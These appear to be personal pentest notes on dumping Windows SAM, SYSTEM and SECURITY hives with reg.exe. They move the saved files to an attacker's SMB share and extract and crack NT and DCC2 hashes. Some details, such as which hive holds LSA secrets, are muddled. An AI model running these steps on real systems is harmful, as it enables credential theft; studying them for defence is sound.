THESE 3 ARE LIKE THE THREE PILLARS BEHIND WINDOWS AUTHENTICATION 

ASSUMING WE HAVE SHELL AS `NT AUTHORITY\SYSTEM` download the hive files 
	`reg.exe` is a command line registry tool that lets us query,add,delete,recover, save, export, import registry keys and values  from pwsh.  Works on remote machines (HKLM/HKU only).
```cmd 
reg.exe save hklm\sam C:\sam.save 
reg.exe save hklm\system C:\sys.save
reg.exe save hklm\security C:\sec.save
```

Set up an smbserver for transfer 
```bash
python3 smbserver.py --smb2support SHARENAME /path/to/save
```
download the files on attacker:
```cmd 
move sam.save \\<hoost ip>\SHARENAME
```

- They are `registry hive files`
- They live under `C:\Windows\System32\config`
	- `C:\Windows\System32\config\SAM`
		-> The database of local users and their passwords 
		-> LM and NTLM password hashes, `lm_hash:nt_hash` in the values uner `SAM\Domains\Account\Users`
		-> RIDs(relative identifiers) mapping users to SIDs
		-> Acc attributes: disabled, locked, password-not-required, etc 
		-> The keys are encrypted with a boot key from THE `SYSTEM` HIVE
		-> `secretsdump.py` dumps SAM hashes as well as data\boot key from `SYSTEM` 
			-> `username:RID:LM_hash:NT_hash:::` format eg, `bob:1001:aad3b435b51404eeaad3b435b51404ee:3c0e5d303ec84884ad5c3b7876a06ea6:::`
			-> focus on the NT_hash 
			-> Hashcat mode 1000
			-> `awk -F: '{print $4}' nthashes` to get only the last field 

	- `C:\Windows\System32\config\SYSTEM`
		-> System registry hive.
		-> Machine-wide system config 
		-> current control set- A **control set** in Windows is a registry key under `HKEY_LOCAL_MACHINE\SYSTEM` that stores the configuration data Windows uses to boot and run the system device drivers, services, paging file settings, etc
		-> Local Security Authority(LSA) secrets, stored under `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets` , accessible only to SYSTEM-privileged processes. 
			-> **LSA secrets** are just passwords that Windows saves so it can log in on your behalf without you typing them.
			-> Service acc passes, DPAPI local keys (`dpapi_userkey`, `dpapi_machinekey`), and EFS/encryption keys.
		-> contains cached domain logon information, specifically in the form of DCC2 hashes. These are local, hashed copies of network credential hashes. An example is:
			-> `$DCC2$10240#Administrator#4c253e4b65c007a8cd683ea57bc43c76`
			-> syntax:`$DCC2$<rounds>#<username>#<32-char hex digest>` 
				-> `$DCC2$` - signature, 
	- `C:\Windows\System32\config\SECURITY `
